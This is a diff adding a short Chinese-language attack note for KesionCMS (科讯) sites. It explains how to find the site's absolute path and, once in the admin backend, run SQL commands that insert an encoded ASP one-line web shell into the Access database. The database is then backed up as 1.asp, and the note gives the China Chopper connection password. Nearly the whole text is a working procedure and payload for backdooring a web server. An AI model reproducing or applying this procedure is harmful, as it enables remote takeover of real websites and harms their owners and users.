@@ -1,0 +1,9 @@
+1.可以在数据库备份中找到网站的绝对路径 
+
+2.利用科讯SQL注入漏洞利用工具也能找到
+ 
+进入后台后执行sql命令：
+create table E:\wenxiushi\wz001\\KS_Data\Collect\KS_Collect.Mdb.cmd  (a varchar(50))
+insert into E:\wenxiushi\wz001\KS_Data\Collect\KS_Collect.Mdb.cmd  (a) values ('┼攠數畣整爠煥敵瑳∨∣┩愾') 
+
+接着数据库备份成1.asp  菜刀连接密码：# 
